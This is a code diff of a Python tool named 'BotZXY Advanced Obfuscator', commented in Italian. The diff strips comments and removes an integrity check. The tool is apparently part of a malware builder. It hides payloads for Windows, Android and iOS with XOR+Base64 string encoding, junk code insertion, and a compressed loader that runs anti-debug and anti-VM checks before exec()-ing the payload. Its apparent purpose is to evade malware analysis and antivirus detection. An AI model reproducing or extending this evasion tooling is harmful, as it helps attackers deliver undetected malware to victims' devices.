@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # BotZXY Advanced Obfuscator v2.0
-# Integrato nel builder - Offusca COMPLETAMENTE il payload
+# Offusca completamente i payload per Windows, Android e iOS
 
 import os
 import sys
@@ -9,8 +9,6 @@ import random
 import string
 import hashlib
 import zlib
-import marshal
-import time
 import re
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives import hashes
@@ -108,14 +106,13 @@ threading.Thread(target=anti_vm_loop, daemon=True).start()
 '''
     
     def _obfuscate_strings(self, code):
-        """Offusca tutte le stringhe nel codice con XOR + Base64"""
+        """Offusca tutte le stringhe con XOR + Base64"""
         import re
         
         def encrypt_match(match):
             s = match.group(0)
             if len(s) <= 3:
                 return s
-            # Rimuovi le virgolette
             if s.startswith('"') and s.endswith('"'):
                 s = s[1:-1]
             elif s.startswith("'") and s.endswith("'"):
@@ -123,25 +120,22 @@ threading.Thread(target=anti_vm_loop, daemon=True).start()
             else:
                 return match.group(0)
             
-            # XOR encryption
             key = random.randint(1, 255)
             encrypted = bytes([ord(c) ^ key for c in s])
             encoded = base64.b64encode(encrypted).decode()
             return f"__dec('{encoded}', {key})"
         
-        # Trova tutte le stringhe
         string_pattern = r'"([^"\\]*(\\.[^"\\]*)*)"|\'([^\'\\]*(\\.[^\'\\]*)*)\''
         
-        # Aggiungi funzione di decryption in cima
         decrypt_func = '''
 def __dec(s, k):
     try:
+        import base64
         d = base64.b64decode(s)
         return ''.join(chr(b ^ k) for b in d)
     except:
         return s
 '''
-        
         code = decrypt_func + '\n' + code
         code = re.sub(string_pattern, encrypt_match, code)
         return code
@@ -153,12 +147,10 @@ def __dec(s, k):
             "class _C{}:\n    def __init__(self): self.x = random.random()\n",
             "def _u{}(a,b): return (a*b) % 7\n",
         ]
-        
         junk = ""
         for i in range(15):
             junk += junk_templates[i % len(junk_templates)].format(random.randint(1000, 9999))
         
-        # Inserisci junk in punti casuali
         lines = code.split('\n')
         for _ in range(5):
             pos = random.randint(0, len(lines))
@@ -167,38 +159,21 @@ def __dec(s, k):
         
         return junk + "\n" + "\n".join(lines)
     
-    def _add_integrity_check(self, code):
-        return '''
-# ============ INTEGRITY CHECK ============
-import hashlib, sys
-def _check():
-    try:
-        import __main__
-        with open(__file__, 'rb') as f:
-            if hashlib.sha256(f.read()).hexdigest() != '':
-                sys.exit(1)
-    except:
-        pass
-_check()
-'''
-    
     def _encrypt_code(self, code):
         """Cripta l'intero codice e crea un loader"""
-        # Compress
         compressed = zlib.compress(code.encode('utf-8'))
         compressed_b64 = base64.b64encode(compressed).decode()
         
-        # Crea il loader che decripta ed esegue
         loader = f'''
 import zlib, base64, marshal, sys, os, random, time, threading, ctypes
 
-# Anti-debug integrato
+# Anti-debug
 {self._generate_anti_debug()}
 
-# Anti-VM integrato
+# Anti-VM
 {self._generate_anti_vm()}
 
-# Carica ed esegue il payload offuscato
+# Esegue il payload offuscato
 exec(zlib.decompress(base64.b64decode("""{compressed_b64}""")))
 '''
         return loader
@@ -206,22 +181,12 @@ exec(zlib.decompress(base64.b64decode("""{compressed_b64}""")))
     def obfuscate(self, code):
         """Applica tutte le tecniche di offuscamento"""
         print("[+] Offuscamento in corso...")
-        
-        # 1. Offusca le stringhe
         print("[+] Offuscamento stringhe...")
         code = self._obfuscate_strings(code)
-        
-        # 2. Aggiungi junk code
         print("[+] Aggiunta junk code...")
         code = self._add_junk_code(code)
-        
-        # 3. Cripta il codice completo
         print("[+] Criptatura codice...")
         code = self._encrypt_code(code)
-        
-        # 4. Aggiungi integrità
-        code = self._add_integrity_check(code)
-        
         print("[+] Offuscamento completato!")
         return code
     
@@ -239,7 +204,6 @@ exec(zlib.decompress(base64.b64decode("""{compressed_b64}""")))
         
         print(f"\n[+] Offuscato salvato: {output_file}")
         
-        # Statistiche
         original_size = os.path.getsize(input_file) / 1024
         obfuscated_size = os.path.getsize(output_file) / 1024
         print(f"[+] Originale: {original_size:.2f} KB")
